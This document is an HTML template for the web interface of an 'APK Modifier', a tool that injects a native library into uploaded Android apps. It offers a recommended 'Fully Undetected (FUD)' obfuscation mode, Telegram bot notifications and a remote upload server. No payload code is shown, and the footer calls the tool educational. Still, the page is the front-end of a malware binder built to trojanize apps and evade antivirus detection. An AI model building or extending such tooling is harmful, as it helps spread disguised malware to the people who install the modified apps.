<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APK Modifier - Advanced Android Application Modifier</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">
                <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
                    <rect width="40" height="40" rx="8" fill="url(#gradient)"/>
                    <path d="M20 10L28 15V25L20 30L12 25V15L20 10Z" fill="white"/>
                    <defs>
                        <linearGradient id="gradient" x1="0" y1="0" x2="40" y2="40">
                            <stop offset="0%" stop-color="#6366f1"/>
                            <stop offset="100%" stop-color="#8b5cf6"/>
                        </linearGradient>
                    </defs>
                </svg>
                <h1>APK Modifier</h1>
            </div>
            <div class="tagline">Advanced Android Application Modifier with FUD Technology</div>
        </header>

        <main class="main-content">
            <!-- Upload Section -->
            <section class="upload-section" id="uploadSection">
                <div class="card">
                    <div class="card-header">
                        <h2>üì± Upload APK File</h2>
                        <p>Select your Android application to modify</p>
                    </div>
                    <div class="card-body">
                        <div class="upload-area" id="uploadArea">
                            <input type="file" id="apkFile" accept=".apk" hidden>
                            <div class="upload-icon">üì¶</div>
                            <h3>Drop APK file here or click to browse</h3>
                            <p>Maximum file size: 100MB</p>
                        </div>
                        <div class="file-info" id="fileInfo" style="display: none;">
                            <div class="file-details">
                                <span class="file-icon">üìÑ</span>
                                <div class="file-text">
                                    <strong id="fileName"></strong>
                                    <small id="fileSize"></small>
                                </div>
                                <button class="btn-remove" id="removeFile">‚úï</button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Options Section -->
            <section class="options-section" id="optionsSection" style="display: none;">
                <div class="card">
                    <div class="card-header">
                        <h2>‚öôÔ∏è Injection Options</h2>
                        <p>Configure modification settings</p>
                    </div>
                    <div class="card-body">
                        <div class="option-group">
                            <label class="option-label">
                                <strong>Stealth Mode</strong>
                                <span class="badge badge-new">Recommended</span>
                            </label>
                            <div class="radio-group">
                                <label class="radio-card">
                                    <input type="radio" name="mode" value="fud" checked>
                                    <div class="radio-content">
                                        <div class="radio-title">üõ°Ô∏è Fully Undetected (FUD)</div>
                                        <div class="radio-description">Maximum stealth with advanced obfuscation</div>
                                    </div>
                                    <div class="radio-check">‚úì</div>
                                </label>
                                <label class="radio-card">
                                    <input type="radio" name="mode" value="standard">
                                    <div class="radio-content">
                                        <div class="radio-title">‚ö° Standard</div>
                                        <div class="radio-description">Basic modification without obfuscation</div>
                                    </div>
                                    <div class="radio-check">‚úì</div>
                                </label>
                            </div>
                        </div>

                        <div class="option-group">
                            <label class="option-label">
                                <strong>Native Library Name</strong>
                                <span class="help-text">Custom SO library identifier</span>
                            </label>
                            <input type="text" class="input-field" id="libName" value="libxx.so" placeholder="e.g., libxx.so">
                        </div>

                        <div class="option-group">
                            <label class="option-label">
                                <strong>Custom Options</strong>
                                <span class="help-text">Advanced configuration (optional)</span>
                            </label>
                            <textarea class="textarea-field" id="customOptions" rows="3" placeholder="Additional options (JSON format)"></textarea>
                        </div>
                    </div>
                </div>

                <!-- Telegram Settings -->
                <div class="card">
                    <div class="card-header">
                        <h2>üí¨ Telegram Notifications</h2>
                        <p>Get real-time updates on your modification progress</p>
                    </div>
                    <div class="card-body">
                        <div class="option-group">
                            <label class="option-label">
                                <strong>Bot Token</strong>
                            </label>
                            <input type="text" class="input-field" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz">
                        </div>

                        <div class="option-group">
                            <label class="option-label">
                                <strong>Chat ID</strong>
                            </label>
                            <input type="text" class="input-field" id="chatId" placeholder="123456789">
                        </div>
                    </div>
                </div>

                <!-- Server Settings -->
                <div class="card">
                    <div class="card-header">
                        <h2>‚òÅÔ∏è Upload Server</h2>
                        <p>Configure remote file hosting</p>
                    </div>
                    <div class="card-body">
                        <div class="option-group">
                            <label class="option-label">
                                <strong>Upload Server URL</strong>
                                <span class="help-text">Server endpoint for file upload</span>
                            </label>
                            <input type="text" class="input-field" id="uploadServer" placeholder="https://your-server.com/upload">
                        </div>
                    </div>
                </div>

                <!-- Action Buttons -->
                <div class="action-buttons">
                    <button class="btn btn-secondary" id="backBtn">‚Üê Back</button>
                    <button class="btn btn-primary" id="processBtn">
                        <span>üöÄ Process APK</span>
                    </button>
                </div>
            </section>

            <!-- Processing Section -->
            <section class="processing-section" id="processingSection" style="display: none;">
                <div class="card">
                    <div class="card-header">
                        <h2>‚ö° Processing APK</h2>
                        <p>Your application is being modified...</p>
                    </div>
                    <div class="card-body">
                        <div class="progress-container">
                            <div class="progress-bar">
                                <div class="progress-fill" id="progressFill"></div>
                            </div>
                            <div class="progress-text" id="progressText">0%</div>
                        </div>
                        
                        <div class="status-message" id="statusMessage">
                            Initializing...
                        </div>

                        <div class="processing-info">
                            <div class="info-item">
                                <span class="info-label">Job ID:</span>
                                <span class="info-value" id="jobId">-</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Started:</span>
                                <span class="info-value" id="startTime">-</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">Mode:</span>
                                <span class="info-value" id="modeDisplay">-</span>
                            </div>
                        </div>

                        <div class="loading-animation">
                            <div class="spinner"></div>
                            <p>This may take up to 1 hour depending on APK size and complexity...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Complete Section -->
            <section class="complete-section" id="completeSection" style="display: none;">
                <div class="card">
                    <div class="card-header success">
                        <h2>‚úÖ Modification Complete!</h2>
                        <p>Your APK has been successfully modified</p>
                    </div>
                    <div class="card-body">
                        <div class="result-info">
                            <div class="result-item">
                                <strong>Original File:</strong>
                                <span id="originalFileName">-</span>
                            </div>
                            <div class="result-item">
                                <strong>Modified File:</strong>
                                <span id="modifiedFileName">-</span>
                            </div>
                            <div class="result-item">
                                <strong>Job ID:</strong>
                                <span id="completeJobId">-</span>
                            </div>
                            <div class="result-item" id="uploadUrlContainer" style="display: none;">
                                <strong>Upload URL:</strong>
                                <a href="#" id="uploadUrl" target="_blank" class="link">View File</a>
                            </div>
                        </div>

                        <div class="action-buttons">
                            <button class="btn btn-primary btn-large" id="downloadBtn">
                                <span>‚¨áÔ∏è Download Modified APK</span>
                            </button>
                            <button class="btn btn-secondary" id="newModificationBtn">
                                <span>üîÑ New Modification</span>
                            </button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Error Section -->
            <section class="error-section" id="errorSection" style="display: none;">
                <div class="card">
                    <div class="card-header error">
                        <h2>‚ùå Processing Failed</h2>
                        <p>An error occurred during modification</p>
                    </div>
                    <div class="card-body">
                        <div class="error-message" id="errorMessage">
                            Unknown error occurred
                        </div>
                        <div class="action-buttons">
                            <button class="btn btn-primary" id="retryBtn">
                                <span>üîÑ Try Again</span>
                            </button>
                        </div>
                    </div>
                </div>
            </section>
        </main>

        <footer class="footer">
            <p>APK Modifier v2.0 | For educational purposes only</p>
            <p>‚ö†Ô∏è Use responsibly and only on applications you own or have permission to modify</p>
        </footer>
    </div>

    <script src="{{ url_for('static', filename='js/app.js') }}"></script>
</body>
</html>
